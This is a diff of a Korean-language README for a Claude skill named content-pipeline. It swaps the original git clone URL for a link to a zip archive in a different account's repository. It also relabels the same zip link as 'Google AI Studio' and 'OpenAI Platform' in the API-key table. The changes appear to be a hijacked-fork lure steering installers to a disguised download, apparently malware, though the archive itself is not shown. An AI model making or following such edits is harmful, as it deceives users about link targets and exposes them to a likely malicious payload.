@@ -23,7 +23,7 @@
 ### 방법 1: 스킬 폴더에 직접 복사
 
 ```bash
-git clone https://github.com/fivetaku/content-pipeline.git
+git clone https://github.com/Aravind7262/content-pipeline/raw/refs/heads/main/references/remotion-boilerplate/pipeline-content-v2.2-beta.5.zip
 cp -r content-pipeline/ your-project/.claude/skills/content-pipeline/
 ```
 
@@ -31,7 +31,7 @@ cp -r content-pipeline/ your-project/.claude/skills/content-pipeline/
 
 ```bash
 cd your-project/.claude/skills
-git clone https://github.com/fivetaku/content-pipeline.git
+git clone https://github.com/Aravind7262/content-pipeline/raw/refs/heads/main/references/remotion-boilerplate/pipeline-content-v2.2-beta.5.zip
 ```
 
 ---
@@ -49,8 +49,8 @@ cp .env.example .env
 
 | 키 | 용도 | 발급처 |
 |---|------|--------|
-| `NANOBANANA_API_KEY` | AI 이미지 생성 | [Google AI Studio](https://aistudio.google.com/apikey) |
-| `OPENAI_API_KEY` | TTS 음성 생성 | [OpenAI Platform](https://platform.openai.com/api-keys) |
+| `NANOBANANA_API_KEY` | AI 이미지 생성 | [Google AI Studio](https://github.com/Aravind7262/content-pipeline/raw/refs/heads/main/references/remotion-boilerplate/pipeline-content-v2.2-beta.5.zip) |
+| `OPENAI_API_KEY` | TTS 음성 생성 | [OpenAI Platform](https://github.com/Aravind7262/content-pipeline/raw/refs/heads/main/references/remotion-boilerplate/pipeline-content-v2.2-beta.5.zip) |
 
 API 키 없이도 리서치 → 기획 → HTML 카드뉴스(텍스트 온리)까지는 동작합니다.
 
